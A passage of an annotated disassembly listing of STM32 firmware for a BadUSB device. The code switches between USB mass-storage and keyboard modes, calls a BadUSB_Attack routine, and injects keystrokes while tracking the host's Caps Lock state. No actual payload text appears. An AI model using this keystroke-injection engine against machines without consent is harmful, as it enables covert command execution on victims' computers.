 800062a:	d1fc      	bne.n	8000626 <main+0x9e>
				  SwitchToHID();
 800062c:	f000 f88a 	bl	8000744 <SwitchToHID>
				  BadUSB_Attack(1);
 8000630:	2001      	movs	r0, #1
 8000632:	f000 fa7d 	bl	8000b30 <BadUSB_Attack>
				  break;
 8000636:	bf00      	nop
		  flag = 0;
 8000638:	2300      	movs	r3, #0
 800063a:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 800063c:	f000 f89a 	bl	8000774 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 8000640:	e7bd      	b.n	80005be <main+0x36>
 8000642:	bf00      	nop
 8000644:	20000978 	.word	0x20000978
 8000648:	2000025c 	.word	0x2000025c
 800064c:	20000270 	.word	0x20000270
 8000650:	40022000 	.word	0x40022000

08000654 <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 8000654:	b580      	push	{r7, lr}
 8000656:	b096      	sub	sp, #88	; 0x58
 8000658:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 800065a:	f107 0314 	add.w	r3, r7, #20
 800065e:	2244      	movs	r2, #68	; 0x44
 8000660:	2100      	movs	r1, #0
 8000662:	4618      	mov	r0, r3
 8000664:	f00c fd98 	bl	800d198 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000668:	463b      	mov	r3, r7
 800066a:	2200      	movs	r2, #0
 800066c:	601a      	str	r2, [r3, #0]
 800066e:	605a      	str	r2, [r3, #4]
 8000670:	609a      	str	r2, [r3, #8]
 8000672:	60da      	str	r2, [r3, #12]
 8000674:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 8000676:	f44f 7000 	mov.w	r0, #512	; 0x200
 800067a:	f003 f995 	bl	80039a8 <HAL_PWREx_ControlVoltageScaling>
 800067e:	4603      	mov	r3, r0
 8000680:	2b00      	cmp	r3, #0
 8000682:	d001      	beq.n	8000688 <SystemClock_Config+0x34>
  {
    Error_Handler();
 8000684:	f000 fbda 	bl	8000e3c <Error_Handler>
  }

  /** Configure LSE Drive Capability
  */
  HAL_PWR_EnableBkUpAccess();
 8000688:	f003 f970 	bl	800396c <HAL_PWR_EnableBkUpAccess>
  __HAL_RCC_LSEDRIVE_CONFIG(RCC_LSEDRIVE_LOW);
 800068c:	4b21      	ldr	r3, [pc, #132]	; (8000714 <SystemClock_Config+0xc0>)
 800068e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8000692:	4a20      	ldr	r2, [pc, #128]	; (8000714 <SystemClock_Config+0xc0>)
 8000694:	f023 0318 	bic.w	r3, r3, #24
 8000698:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_LSE|RCC_OSCILLATORTYPE_MSI;
 800069c:	2314      	movs	r3, #20
 800069e:	617b      	str	r3, [r7, #20]
  RCC_OscInitStruct.LSEState = RCC_LSE_ON;
 80006a0:	2301      	movs	r3, #1
 80006a2:	61fb      	str	r3, [r7, #28]
  RCC_OscInitStruct.MSIState = RCC_MSI_ON;
 80006a4:	2301      	movs	r3, #1
 80006a6:	62fb      	str	r3, [r7, #44]	; 0x2c
  RCC_OscInitStruct.MSICalibrationValue = 0;
 80006a8:	2300      	movs	r3, #0
 80006aa:	633b      	str	r3, [r7, #48]	; 0x30
  RCC_OscInitStruct.MSIClockRange = RCC_MSIRANGE_6;
 80006ac:	2360      	movs	r3, #96	; 0x60
 80006ae:	637b      	str	r3, [r7, #52]	; 0x34
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
 80006b0:	2302      	movs	r3, #2
 80006b2:	63fb      	str	r3, [r7, #60]	; 0x3c
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_MSI;
 80006b4:	2301      	movs	r3, #1
 80006b6:	643b      	str	r3, [r7, #64]	; 0x40
  RCC_OscInitStruct.PLL.PLLM = 1;
 80006b8:	2301      	movs	r3, #1
 80006ba:	647b      	str	r3, [r7, #68]	; 0x44
  RCC_OscInitStruct.PLL.PLLN = 24;
 80006bc:	2318      	movs	r3, #24
 80006be:	64bb      	str	r3, [r7, #72]	; 0x48
  RCC_OscInitStruct.PLL.PLLP = RCC_PLLP_DIV7;
 80006c0:	2307      	movs	r3, #7
 80006c2:	64fb      	str	r3, [r7, #76]	; 0x4c
  RCC_OscInitStruct.PLL.PLLQ = RCC_PLLQ_DIV2;
 80006c4:	2302      	movs	r3, #2
 80006c6:	653b      	str	r3, [r7, #80]	; 0x50
  RCC_OscInitStruct.PLL.PLLR = RCC_PLLR_DIV2;
 80006c8:	2302      	movs	r3, #2
 80006ca:	657b      	str	r3, [r7, #84]	; 0x54
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
 80006cc:	f107 0314 	add.w	r3, r7, #20
 80006d0:	4618      	mov	r0, r3
 80006d2:	f003 f9cf 	bl	8003a74 <HAL_RCC_OscConfig>
 80006d6:	4603      	mov	r3, r0
 80006d8:	2b00      	cmp	r3, #0
 80006da:	d001      	beq.n	80006e0 <SystemClock_Config+0x8c>
  {
    Error_Handler();
 80006dc:	f000 fbae 	bl	8000e3c <Error_Handler>
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
 80006e0:	230f      	movs	r3, #15
 80006e2:	603b      	str	r3, [r7, #0]
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
 80006e4:	2303      	movs	r3, #3
 80006e6:	607b      	str	r3, [r7, #4]
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
 80006e8:	2300      	movs	r3, #0
 80006ea:	60bb      	str	r3, [r7, #8]
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV1;
 80006ec:	2300      	movs	r3, #0
 80006ee:	60fb      	str	r3, [r7, #12]
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
 80006f0:	2300      	movs	r3, #0
 80006f2:	613b      	str	r3, [r7, #16]

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
 80006f4:	463b      	mov	r3, r7
 80006f6:	2102      	movs	r1, #2
 80006f8:	4618      	mov	r0, r3
 80006fa:	f003 fdcf 	bl	800429c <HAL_RCC_ClockConfig>
 80006fe:	4603      	mov	r3, r0
 8000700:	2b00      	cmp	r3, #0
 8000702:	d001      	beq.n	8000708 <SystemClock_Config+0xb4>
  {
    Error_Handler();
 8000704:	f000 fb9a 	bl	8000e3c <Error_Handler>
  }

  /** Enable MSI Auto calibration
  */
  HAL_RCCEx_EnableMSIPLLMode();
 8000708:	f004 f9e2 	bl	8004ad0 <HAL_RCCEx_EnableMSIPLLMode>
}
 800070c:	bf00      	nop
 800070e:	3758      	adds	r7, #88	; 0x58
 8000710:	46bd      	mov	sp, r7
 8000712:	bd80      	pop	{r7, pc}
 8000714:	40021000 	.word	0x40021000

08000718 <SimulateUSB_unplug>:

/* USER CODE BEGIN 4 */
void SimulateUSB_unplug(){
 8000718:	b580      	push	{r7, lr}
 800071a:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 800071c:	2200      	movs	r2, #0
 800071e:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000722:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000726:	f001 fb45 	bl	8001db4 <HAL_GPIO_WritePin>
}
 800072a:	bf00      	nop
 800072c:	bd80      	pop	{r7, pc}

0800072e <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 800072e:	b580      	push	{r7, lr}
 8000730:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 8000732:	2201      	movs	r2, #1
 8000734:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000738:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800073c:	f001 fb3a 	bl	8001db4 <HAL_GPIO_WritePin>
}
 8000740:	bf00      	nop
 8000742:	bd80      	pop	{r7, pc}

08000744 <SwitchToHID>:

void SwitchToHID(){
 8000744:	b580      	push	{r7, lr}
 8000746:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000748:	f7ff ffe6 	bl	8000718 <SimulateUSB_unplug>
	isMSC = 0;
 800074c:	4b08      	ldr	r3, [pc, #32]	; (8000770 <SwitchToHID+0x2c>)
 800074e:	2200      	movs	r2, #0
 8000750:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000752:	2032      	movs	r0, #50	; 0x32
 8000754:	f000 fe16 	bl	8001384 <HAL_Delay>
	SimulateUSB_plugin();
 8000758:	f7ff ffe9 	bl	800072e <SimulateUSB_plugin>
	MX_TIM2_Init();
 800075c:	f000 fc68 	bl	8001030 <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 8000760:	f00b fee2 	bl	800c528 <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 8000764:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000768:	f000 fe0c 	bl	8001384 <HAL_Delay>
}
 800076c:	bf00      	nop
 800076e:	bd80      	pop	{r7, pc}
 8000770:	20000978 	.word	0x20000978

08000774 <SwitchToMSC>:

void SwitchToMSC(){
 8000774:	b580      	push	{r7, lr}
 8000776:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 8000778:	f7ff ffce 	bl	8000718 <SimulateUSB_unplug>
	isMSC = 1;
 800077c:	4b07      	ldr	r3, [pc, #28]	; (800079c <SwitchToMSC+0x28>)
 800077e:	2201      	movs	r2, #1
 8000780:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 8000782:	2032      	movs	r0, #50	; 0x32
 8000784:	f000 fdfe 	bl	8001384 <HAL_Delay>
	SimulateUSB_plugin();
 8000788:	f7ff ffd1 	bl	800072e <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 800078c:	f00b fefc 	bl	800c588 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 8000790:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000794:	f000 fdf6 	bl	8001384 <HAL_Delay>
}
 8000798:	bf00      	nop
 800079a:	bd80      	pop	{r7, pc}
 800079c:	20000978 	.word	0x20000978

080007a0 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 80007a0:	b580      	push	{r7, lr}
 80007a2:	b0a4      	sub	sp, #144	; 0x90
 80007a4:	af00      	add	r7, sp, #0
 80007a6:	4603      	mov	r3, r0
 80007a8:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007aa:	220f      	movs	r2, #15
 80007ac:	2100      	movs	r1, #0
 80007ae:	4821      	ldr	r0, [pc, #132]	; (8000834 <Get_Single_Descriptor+0x94>)
 80007b0:	f00c fcf2 	bl	800d198 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80007b4:	4a20      	ldr	r2, [pc, #128]	; (8000838 <Get_Single_Descriptor+0x98>)
 80007b6:	f107 0308 	add.w	r3, r7, #8
 80007ba:	4611      	mov	r1, r2
 80007bc:	2286      	movs	r2, #134	; 0x86
 80007be:	4618      	mov	r0, r3
 80007c0:	f00c fd16 	bl	800d1f0 <memcpy>
	Convert2CapsMap(Map);
 80007c4:	f107 0308 	add.w	r3, r7, #8
 80007c8:	4618      	mov	r0, r3
 80007ca:	f000 f93f 	bl	8000a4c <Convert2CapsMap>
	uint8_t pos = Map[ascii];
 80007ce:	79fb      	ldrb	r3, [r7, #7]
 80007d0:	3390      	adds	r3, #144	; 0x90
 80007d2:	443b      	add	r3, r7
 80007d4:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 80007d8:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80007dc:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007e0:	091b      	lsrs	r3, r3, #4
 80007e2:	b2db      	uxtb	r3, r3
 80007e4:	461a      	mov	r2, r3
 80007e6:	4b13      	ldr	r3, [pc, #76]	; (8000834 <Get_Single_Descriptor+0x94>)
 80007e8:	5c9b      	ldrb	r3, [r3, r2]
 80007ea:	b25a      	sxtb	r2, r3
 80007ec:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 80007f0:	f003 0307 	and.w	r3, r3, #7
 80007f4:	2101      	movs	r1, #1
 80007f6:	fa01 f303 	lsl.w	r3, r1, r3
 80007fa:	b25b      	sxtb	r3, r3
 80007fc:	4313      	orrs	r3, r2
 80007fe:	b259      	sxtb	r1, r3
 8000800:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000804:	091b      	lsrs	r3, r3, #4
 8000806:	b2db      	uxtb	r3, r3
 8000808:	461a      	mov	r2, r3
 800080a:	b2c9      	uxtb	r1, r1
 800080c:	4b09      	ldr	r3, [pc, #36]	; (8000834 <Get_Single_Descriptor+0x94>)
 800080e:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 8000810:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000814:	f003 0308 	and.w	r3, r3, #8
 8000818:	2b00      	cmp	r3, #0
 800081a:	d006      	beq.n	800082a <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 800081c:	4b05      	ldr	r3, [pc, #20]	; (8000834 <Get_Single_Descriptor+0x94>)
 800081e:	781b      	ldrb	r3, [r3, #0]
 8000820:	f043 0302 	orr.w	r3, r3, #2
 8000824:	b2da      	uxtb	r2, r3
 8000826:	4b03      	ldr	r3, [pc, #12]	; (8000834 <Get_Single_Descriptor+0x94>)
 8000828:	701a      	strb	r2, [r3, #0]
}
 800082a:	bf00      	nop
 800082c:	3790      	adds	r7, #144	; 0x90
 800082e:	46bd      	mov	sp, r7
 8000830:	bd80      	pop	{r7, pc}
 8000832:	bf00      	nop
 8000834:	2000025c 	.word	0x2000025c
 8000838:	0800d224 	.word	0x0800d224

0800083c <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 800083c:	b580      	push	{r7, lr}
 800083e:	b0a6      	sub	sp, #152	; 0x98
 8000840:	af00      	add	r7, sp, #0
 8000842:	6078      	str	r0, [r7, #4]
 8000844:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000846:	220f      	movs	r2, #15
 8000848:	2100      	movs	r1, #0
 800084a:	482a      	ldr	r0, [pc, #168]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 800084c:	f00c fca4 	bl	800d198 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000850:	4a29      	ldr	r2, [pc, #164]	; (80008f8 <Get_Multi_Descriptor+0xbc>)
 8000852:	f107 030c 	add.w	r3, r7, #12
 8000856:	4611      	mov	r1, r2
 8000858:	2286      	movs	r2, #134	; 0x86
 800085a:	4618      	mov	r0, r3
 800085c:	f00c fcc8 	bl	800d1f0 <memcpy>
	Convert2CapsMap(Map);
 8000860:	f107 030c 	add.w	r3, r7, #12
 8000864:	4618      	mov	r0, r3
 8000866:	f000 f8f1 	bl	8000a4c <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 800086a:	2300      	movs	r3, #0
 800086c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000870:	e036      	b.n	80008e0 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 8000872:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 8000876:	687a      	ldr	r2, [r7, #4]
 8000878:	4413      	add	r3, r2
 800087a:	781b      	ldrb	r3, [r3, #0]
 800087c:	3398      	adds	r3, #152	; 0x98
 800087e:	443b      	add	r3, r7
 8000880:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 8000884:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 8000888:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800088c:	091b      	lsrs	r3, r3, #4
 800088e:	b2db      	uxtb	r3, r3
 8000890:	461a      	mov	r2, r3
 8000892:	4b18      	ldr	r3, [pc, #96]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 8000894:	5c9b      	ldrb	r3, [r3, r2]
 8000896:	b25a      	sxtb	r2, r3
 8000898:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800089c:	f003 0307 	and.w	r3, r3, #7
 80008a0:	2101      	movs	r1, #1
 80008a2:	fa01 f303 	lsl.w	r3, r1, r3
 80008a6:	b25b      	sxtb	r3, r3
 80008a8:	4313      	orrs	r3, r2
 80008aa:	b259      	sxtb	r1, r3
 80008ac:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008b0:	091b      	lsrs	r3, r3, #4
 80008b2:	b2db      	uxtb	r3, r3
 80008b4:	461a      	mov	r2, r3
 80008b6:	b2c9      	uxtb	r1, r1
 80008b8:	4b0e      	ldr	r3, [pc, #56]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008ba:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 80008bc:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80008c0:	f003 0308 	and.w	r3, r3, #8
 80008c4:	2b00      	cmp	r3, #0
 80008c6:	d006      	beq.n	80008d6 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 80008c8:	4b0a      	ldr	r3, [pc, #40]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008ca:	781b      	ldrb	r3, [r3, #0]
 80008cc:	f043 0302 	orr.w	r3, r3, #2
 80008d0:	b2da      	uxtb	r2, r3
 80008d2:	4b08      	ldr	r3, [pc, #32]	; (80008f4 <Get_Multi_Descriptor+0xb8>)
 80008d4:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 80008d6:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80008da:	3301      	adds	r3, #1
 80008dc:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80008e0:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 80008e4:	683b      	ldr	r3, [r7, #0]
 80008e6:	429a      	cmp	r2, r3
 80008e8:	dbc3      	blt.n	8000872 <Get_Multi_Descriptor+0x36>
	}
}
 80008ea:	bf00      	nop
 80008ec:	bf00      	nop
 80008ee:	3798      	adds	r7, #152	; 0x98
 80008f0:	46bd      	mov	sp, r7
 80008f2:	bd80      	pop	{r7, pc}
 80008f4:	2000025c 	.word	0x2000025c
 80008f8:	0800d224 	.word	0x0800d224

080008fc <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 80008fc:	b580      	push	{r7, lr}
 80008fe:	b082      	sub	sp, #8
 8000900:	af00      	add	r7, sp, #0
 8000902:	4603      	mov	r3, r0
 8000904:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 8000906:	79fb      	ldrb	r3, [r7, #7]
 8000908:	4618      	mov	r0, r3
 800090a:	f7ff ff49 	bl	80007a0 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800090e:	220f      	movs	r2, #15
 8000910:	4903      	ldr	r1, [pc, #12]	; (8000920 <SimulateKeyPress+0x24>)
 8000912:	4804      	ldr	r0, [pc, #16]	; (8000924 <SimulateKeyPress+0x28>)
 8000914:	f008 f946 	bl	8008ba4 <USBD_CUSTOM_HID_SendReport>
}
 8000918:	bf00      	nop
 800091a:	3708      	adds	r7, #8
 800091c:	46bd      	mov	sp, r7
 800091e:	bd80      	pop	{r7, pc}
 8000920:	2000025c 	.word	0x2000025c
 8000924:	200003c0 	.word	0x200003c0

08000928 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000928:	b580      	push	{r7, lr}
 800092a:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800092c:	220f      	movs	r2, #15
 800092e:	2100      	movs	r1, #0
 8000930:	4804      	ldr	r0, [pc, #16]	; (8000944 <SimulateKeyRelease+0x1c>)
 8000932:	f00c fc31 	bl	800d198 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000936:	220f      	movs	r2, #15
 8000938:	4902      	ldr	r1, [pc, #8]	; (8000944 <SimulateKeyRelease+0x1c>)
 800093a:	4803      	ldr	r0, [pc, #12]	; (8000948 <SimulateKeyRelease+0x20>)
 800093c:	f008 f932 	bl	8008ba4 <USBD_CUSTOM_HID_SendReport>
}
 8000940:	bf00      	nop
 8000942:	bd80      	pop	{r7, pc}
 8000944:	2000025c 	.word	0x2000025c
 8000948:	200003c0 	.word	0x200003c0

0800094c <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 800094c:	b580      	push	{r7, lr}
 800094e:	b082      	sub	sp, #8
 8000950:	af00      	add	r7, sp, #0
 8000952:	4603      	mov	r3, r0
 8000954:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 8000956:	79fb      	ldrb	r3, [r7, #7]
 8000958:	4618      	mov	r0, r3
 800095a:	f7ff ffcf 	bl	80008fc <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 800095e:	2023      	movs	r0, #35	; 0x23
 8000960:	f000 fd10 	bl	8001384 <HAL_Delay>
	SimulateKeyRelease();
 8000964:	f7ff ffe0 	bl	8000928 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000968:	2023      	movs	r0, #35	; 0x23
 800096a:	f000 fd0b 	bl	8001384 <HAL_Delay>
}
 800096e:	bf00      	nop
 8000970:	3708      	adds	r7, #8
 8000972:	46bd      	mov	sp, r7
 8000974:	bd80      	pop	{r7, pc}
	...

08000978 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 8000978:	b580      	push	{r7, lr}
 800097a:	b082      	sub	sp, #8
 800097c:	af00      	add	r7, sp, #0
 800097e:	6078      	str	r0, [r7, #4]
 8000980:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 8000982:	6839      	ldr	r1, [r7, #0]
 8000984:	6878      	ldr	r0, [r7, #4]
 8000986:	f7ff ff59 	bl	800083c <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 800098a:	e002      	b.n	8000992 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 800098c:	2080      	movs	r0, #128	; 0x80
 800098e:	f7ff ffdd 	bl	800094c <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000992:	4b0c      	ldr	r3, [pc, #48]	; (80009c4 <SimulateShortcutKey+0x4c>)
 8000994:	781b      	ldrb	r3, [r3, #0]
 8000996:	f003 0302 	and.w	r3, r3, #2
 800099a:	2b00      	cmp	r3, #0
 800099c:	d0f6      	beq.n	800098c <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800099e:	220f      	movs	r2, #15
 80009a0:	4909      	ldr	r1, [pc, #36]	; (80009c8 <SimulateShortcutKey+0x50>)
 80009a2:	480a      	ldr	r0, [pc, #40]	; (80009cc <SimulateShortcutKey+0x54>)
 80009a4:	f008 f8fe 	bl	8008ba4 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80009a8:	2023      	movs	r0, #35	; 0x23
 80009aa:	f000 fceb 	bl	8001384 <HAL_Delay>
	SimulateKeyRelease();
 80009ae:	f7ff ffbb 	bl	8000928 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 80009b2:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 80009b6:	f000 fce5 	bl	8001384 <HAL_Delay>
}
 80009ba:	bf00      	nop
 80009bc:	3708      	adds	r7, #8
 80009be:	46bd      	mov	sp, r7
 80009c0:	bd80      	pop	{r7, pc}
 80009c2:	bf00      	nop
 80009c4:	2000026c 	.word	0x2000026c
 80009c8:	2000025c 	.word	0x2000025c
 80009cc:	200003c0 	.word	0x200003c0

080009d0 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 80009d0:	b580      	push	{r7, lr}
 80009d2:	b084      	sub	sp, #16
 80009d4:	af00      	add	r7, sp, #0
 80009d6:	60f8      	str	r0, [r7, #12]
 80009d8:	60b9      	str	r1, [r7, #8]
 80009da:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 80009dc:	687b      	ldr	r3, [r7, #4]
 80009de:	2200      	movs	r2, #0
 80009e0:	601a      	str	r2, [r3, #0]
 80009e2:	e025      	b.n	8000a30 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 80009e4:	4b17      	ldr	r3, [pc, #92]	; (8000a44 <SimulateKeyStrokes+0x74>)
 80009e6:	781b      	ldrb	r3, [r3, #0]
 80009e8:	f003 0302 	and.w	r3, r3, #2
 80009ec:	2b00      	cmp	r3, #0
 80009ee:	d102      	bne.n	80009f6 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 80009f0:	2080      	movs	r0, #128	; 0x80
 80009f2:	f7ff ffab 	bl	800094c <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 80009f6:	687b      	ldr	r3, [r7, #4]
 80009f8:	681b      	ldr	r3, [r3, #0]
 80009fa:	461a      	mov	r2, r3
 80009fc:	68fb      	ldr	r3, [r7, #12]
 80009fe:	4413      	add	r3, r2
 8000a00:	781b      	ldrb	r3, [r3, #0]
 8000a02:	4618      	mov	r0, r3
 8000a04:	f7ff ffa2 	bl	800094c <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 8000a08:	4b0f      	ldr	r3, [pc, #60]	; (8000a48 <SimulateKeyStrokes+0x78>)
 8000a0a:	681b      	ldr	r3, [r3, #0]
 8000a0c:	2b01      	cmp	r3, #1
 8000a0e:	d10a      	bne.n	8000a26 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 8000a10:	4b0d      	ldr	r3, [pc, #52]	; (8000a48 <SimulateKeyStrokes+0x78>)
 8000a12:	2200      	movs	r2, #0
 8000a14:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000a16:	687b      	ldr	r3, [r7, #4]
 8000a18:	681b      	ldr	r3, [r3, #0]
 8000a1a:	1e5a      	subs	r2, r3, #1
 8000a1c:	687b      	ldr	r3, [r7, #4]
 8000a1e:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000a20:	2081      	movs	r0, #129	; 0x81
 8000a22:	f7ff ff93 	bl	800094c <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000a26:	687b      	ldr	r3, [r7, #4]
 8000a28:	681b      	ldr	r3, [r3, #0]
 8000a2a:	1c5a      	adds	r2, r3, #1
 8000a2c:	687b      	ldr	r3, [r7, #4]
 8000a2e:	601a      	str	r2, [r3, #0]
 8000a30:	687b      	ldr	r3, [r7, #4]
 8000a32:	681b      	ldr	r3, [r3, #0]
 8000a34:	68ba      	ldr	r2, [r7, #8]
 8000a36:	429a      	cmp	r2, r3
 8000a38:	dcd4      	bgt.n	80009e4 <SimulateKeyStrokes+0x14>
		}
	}
}
 8000a3a:	bf00      	nop
 8000a3c:	bf00      	nop
 8000a3e:	3710      	adds	r7, #16
 8000a40:	46bd      	mov	sp, r7
 8000a42:	bd80      	pop	{r7, pc}
 8000a44:	2000026c 	.word	0x2000026c
 8000a48:	2000027c 	.word	0x2000027c

08000a4c <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 8000a4c:	b480      	push	{r7}
 8000a4e:	b085      	sub	sp, #20
 8000a50:	af00      	add	r7, sp, #0
 8000a52:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 8000a54:	2341      	movs	r3, #65	; 0x41
 8000a56:	73fb      	strb	r3, [r7, #15]
 8000a58:	e01a      	b.n	8000a90 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 8000a5a:	7bfb      	ldrb	r3, [r7, #15]
 8000a5c:	687a      	ldr	r2, [r7, #4]
 8000a5e:	4413      	add	r3, r2
